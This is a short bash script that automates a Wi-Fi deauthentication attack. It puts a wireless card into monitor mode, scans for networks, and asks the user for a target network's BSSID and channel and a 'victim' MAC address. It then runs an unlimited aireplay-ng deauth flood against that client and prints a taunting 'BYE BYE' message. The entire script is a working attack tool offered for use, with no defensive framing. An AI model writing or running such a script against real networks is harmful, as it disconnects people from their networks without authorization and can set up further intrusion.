#!/bin/bash

echo "Setting wlan0 into monitor mode"

sudo airmon-ng start wlan0

echo "Starting airodump-ng"
echo "Click Ctrl+C to stop monitoring network"

sleep 5

sudo airodump-ng wlan0mon

echo "Enter BSSID of target network"

read -r network_bssid

echo "Enter channel"

read -r channel

echo "Sniffing on $network_bssid: channel $channel"

sudo airodump-ng wlan0mon --bssid "$network_bssid" --channel "$channel"

echo "Enter victims MAC address"
read -r CLI_MAC
echo "Attacking $CLI_MAC. Press Ctrl+C to stop the attack"
sleep 3
echo "BYE BYE $CLI_MAC :)"
sleep 2
sudo aireplay-ng --deauth 0 -c "$CLI_MAC" -a "$network_bssid" wlan0mon
